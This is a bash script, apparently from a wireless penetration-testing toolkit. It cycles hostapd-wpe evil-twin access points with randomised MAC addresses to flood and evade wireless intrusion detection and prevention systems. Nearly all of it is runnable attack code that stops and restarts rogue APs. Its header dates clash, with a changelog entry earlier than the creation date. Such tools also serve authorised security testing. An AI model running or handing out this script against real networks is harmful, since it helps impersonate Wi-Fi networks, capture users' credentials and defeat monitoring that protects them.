#!/bin/bash
# rogue-robin.sh
# 3/15/2016 by Ted R (http://github.com/actuated)
# Shell script for attempting to overwhelm WIDS/WIPS with rogue APs by creating evil twins with different MACs
# Customize hostapd-wpe.conf to match your desired rogue network settings, then configure the vars below
# Kill with ctrl+c, then rerun with --cleanup to change the interface mac back to its permanent value
# 5/12/2015 - Added rfkill to the loop

# Below is your wireless adapter
varInt="wlan0"

# Below is the path to your executable hostapd-wpe implementation
varHostapdWPEPath="/ted/tools/hostapd-wpe/hostapd-2.2/hostapd/"

# This is how long the each rogue AP will run for, before it is stopped, the MAC is changed, and it begins again
varSleep="15s"

varStartDir=$(pwd)
cd $varHostapdWPEPath

function fnDo {
  varTimeNow=$(date +%F-%H-%M-%S)
  echo "==[ $varTimeNow: Starting ]==================================="
  rfkill unblock all
  ip link set $varInt down
  macchanger --random $varInt
  ip link set $varInt up

  airmon-ng check kill

  ./hostapd-wpe $varStartDir/hostapd-wpe.conf &

  sleep $varSleep

  varThisHostAPDPID=$(ps aux | grep hostapd-wpe | grep -v grep | awk '{print $2}')
  kill $varThisHostAPDPID
  sleep 5s
  echo
  fnDo
}

function fnCleanup {
  ip link set $varInt down
  macchanger --permanent $varInt
  ip link set $varInt up
}

if [ "$1" != "--cleanup" ]; then fnDo; fi
fnCleanup



